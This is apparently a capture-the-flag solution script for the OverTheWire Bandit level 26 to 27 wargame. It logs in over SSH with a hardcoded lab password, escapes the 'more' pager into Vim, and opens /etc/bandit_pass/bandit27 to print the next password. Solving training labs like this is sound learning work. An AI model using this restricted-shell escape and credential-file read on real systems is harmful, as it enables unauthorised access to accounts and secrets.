print("[*] Bandit Level 26 -> 27: FINAL VERSION")

let pass = "s0773xxkk0MXfdqOfPRVr9L3jJBUOgCZ"

print("[*] Connecting...")
let ssh = connect_ssh_pty("bandit.labs.overthewire.org", 2220, "bandit26", pass, 3, 20)
ssh_interactive_start(ssh)

print("[*] Step 1: Wait for --More-- and enter Vim")
let initial = ssh_interactive_recv(ssh, 1500)
ssh_interactive_send(ssh, "v")
let vim_start = ssh_interactive_recv(ssh, 1000)

print("[*] Step 2: Press ENTER past Vim startup")
ssh_interactive_send(ssh, "\r")
let vim_ready = ssh_interactive_recv(ssh, 500)

print("[*] Step 3: Open password file")
ssh_interactive_send(ssh, ":e /etc/bandit_pass/bandit27\r")
let warning = ssh_interactive_recv(ssh, 800)

print("[*] Step 4: Press ENTER past readonly warning")
ssh_interactive_send(ssh, "\r")
let password_content = ssh_interactive_recv(ssh, 1000)

print("\n========== PASSWORD FILE CONTENT ==========")
print(password_content)
print("===========================================\n")

ssh_interactive_close(ssh)
print("[+] Level 26 SOLVED!")
